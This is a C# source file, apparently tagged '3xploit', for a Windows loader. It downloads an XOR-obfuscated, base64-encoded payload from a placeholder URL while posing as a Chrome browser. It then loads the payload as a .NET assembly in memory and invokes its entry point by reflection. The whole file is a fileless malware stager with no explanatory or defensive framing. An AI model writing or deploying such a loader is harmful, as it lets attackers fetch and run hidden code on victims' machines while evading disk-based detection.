using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace reflection
{
    static class Program
    {
        /// <summary>
        /// Punto de entrada principal para la aplicación.
        /// </summary>

        static void Main()
        {
            //3xploit 25-08-2020
            var wc = new WebClient();
            wc.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36");
            
            var x1 = Assembly.Load(System.Convert.FromBase64String(XOR_KEY(wc.DownloadString("link"), "pass")));
            
            var x2 = x1.GetType("load_entrypoint_dll.EJECUCION");
            var x3 = Activator.CreateInstance(x2);
            var x4  = x2.GetMethod("Main");

            x4.Invoke(x3, null);

        }
        private static string XOR_KEY(string text, string key)
        {
            var decrypted = new StringBuilder();

            for (int i = 0; i < (text.Length - 1); i++)
            {
                decrypted.Append((char)((uint)text[i] ^ (uint)key[i % key.Length]));
            }

            return decrypted.ToString();
        }
    }
}
